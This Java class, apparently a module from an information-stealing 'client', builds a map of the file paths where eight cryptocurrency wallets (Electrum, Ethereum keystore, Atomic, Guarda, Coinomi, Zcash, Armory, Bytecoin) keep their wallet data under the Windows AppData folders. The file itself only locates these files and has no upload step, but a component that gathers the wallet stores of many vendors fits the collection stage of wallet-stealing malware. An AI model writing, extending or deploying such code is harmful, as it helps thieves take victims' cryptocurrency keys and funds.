package dev.client.module.wallets;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class ColdWallets {
    private final File Zcash;
    private final File Armory;
    private final File Bytecoin;
    private final File Ethereum;
    private final File Electrum;
    private final File AtomicWallet;
    private final File Guarda;
    private final File Coinomi;

    public ColdWallets()
    {
        String appdata = System.getenv("APPDATA");
        String lappdata = System.getenv("LOCALAPPDATA");
        Zcash = new File(appdata + File.separator + "Zcash");
        Armory = new File(appdata + File.separator + "Armory");
        Bytecoin = new File(appdata + File.separator + "bytecoin");
        Ethereum = new File(appdata + File.separator + "Ethereum\\keystore");
        Electrum = new File(appdata + File.separator + "Electrum\\wallets");
        AtomicWallet = new File(appdata + File.separator + "atomic\\Local Storage\\leveldb");
        Guarda = new File(appdata + File.separator + "Guarda\\Local Storage\\leveldb");
        Coinomi = new File(lappdata + File.separator + "Coinomi\\Coinomi\\wallets");
    }

    public Map<String, File> getAllFiles() {
        Map<String, File> wallets = new HashMap<>();
        wallets.put("Zcash/", Zcash);
        wallets.put("Armory/", Armory);
        wallets.put("Bytecoin/", Bytecoin);
        wallets.put("Ethereum/", Ethereum);
        wallets.put("Electrum/", Electrum);
        wallets.put("AtomicWallet/", AtomicWallet);
        wallets.put("Guarda/", Guarda);
        wallets.put("Coinomi/", Coinomi);
        return wallets;
    }
}
